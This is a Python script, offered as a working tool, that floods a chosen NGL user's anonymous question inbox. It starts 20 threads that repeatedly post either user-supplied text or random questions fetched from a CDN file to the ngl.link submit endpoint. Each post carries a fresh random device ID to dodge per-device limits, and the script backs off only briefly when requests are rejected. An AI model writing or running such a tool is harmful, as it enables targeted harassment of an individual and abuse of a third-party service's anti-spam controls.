#!/usr/bin/env python3

import signal
import threading
import json
import random
import string
import time 
import sys
try:
    import requests
except ModuleNotFoundError:
    print("[!] Requests module Not Found!")
    exit()

# global counter (race condition prone!)
COUNTER: int = 0
COOLDOWN_TIMER: int = 2 # in seconds
QUESTIONS: tuple[str] = ()

exit_flag = threading.Event()
cooldown_event = threading.Event()

def deviceId() -> str:
    characters: str = string.ascii_lowercase + ''.join([str(i) for i in range(0, 10)])
    id: list[str] = [
        ''.join([random.choice(characters) for _ in range(0, 8)]),
        ''.join([random.choice(characters) for _ in range(0, 4)]),
        ''.join([random.choice(characters) for _ in range(0, 4)]),
        ''.join([random.choice(characters) for _ in range(0, 12)]),
    ]

    return '-'.join(id)

def trigger_cooldown() -> None:
    if not cooldown_event.is_set():
        cooldown_event.set()
        threading.Thread(target=count_cooldown, daemon=True).start()

def count_cooldown() -> None:
    time.sleep(COOLDOWN_TIMER)
    cooldown_event.clear()

def post_requests(user: str, text) -> None:
    global COUNTER
    url: str = "https://ngl.link/api/submit"

    if text: 
        data: dict[str, str] = {
            'username': user,
            'question': text, 
            'gameSlug': '' ,
            'referrer': '',
        }

        while not exit_flag.is_set():
            while cooldown_event.is_set() and not exit_flag.is_set():
                print(f"\r[$] Message's sent to {user}: {COUNTER}    [cooldown]", end="")
                time.sleep(0.8)

            data['deviceId'] = deviceId()

            try:
                resp = requests.post(url, data=data)
                COUNTER += 1
                print(f"\r[$] Message's sent to {user}: {COUNTER}                      ", end="")
                if resp.status_code != 200:
                    trigger_cooldown()
            except Exception as e:
                print(f"\n[!] Error: {e}")

            time.sleep(0.8)
    else:
        data: dict[str, str] = {
            'username': user,
            'gameSlug': '' ,
            'referrer': '',
        }
        while not exit_flag.is_set():
            while cooldown_event.is_set() and not exit_flag.is_set():
                print(f"\r[$] Message's sent to {user}: {COUNTER}    [cooldown]", end="")
                time.sleep(0.8)

            data['question'] = random.choice(QUESTIONS), 
            data['deviceId'] = deviceId()

            try:
                resp = requests.post(url, data=data)
                COUNTER += 1
                print(f"\r[$] Message's sent to {user}: {COUNTER}                 ", end="")
                if resp.status_code != 200:
                    trigger_cooldown()
            except Exception as e:
                print(f"\n[!] Error: {e}")

            time.sleep(0.8)

def exit_prog(sig: int, frame) -> None:
    print(f"\n[-] CTRL+c pressed killing all threads")
    exit_flag.set()

def main() -> None:
    global QUESTIONS
    user: str = input("[*] Enter the username: ")
    text = input("[*] Enter the text: ") or None
    
    if not text:
        data = requests.get("https://cdn.simplelocalize.io/d6cb2f56863b434c8fba40f9404505f9/_latest/en")
        if data.status_code != 200:
            print("Failed to send data!\n")
            return

        QUESTIONS = tuple(json.loads(data.text).values())
        print(len(QUESTIONS))

    signal.signal(signal.SIGINT, exit_prog)
    
    threads = []
    for _ in range(20):
        thread = threading.Thread(target=post_requests, args=(user, text))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
    
    print(f"\n[*] All threads were killed gracefully")

if __name__ == "__main__":
    main()
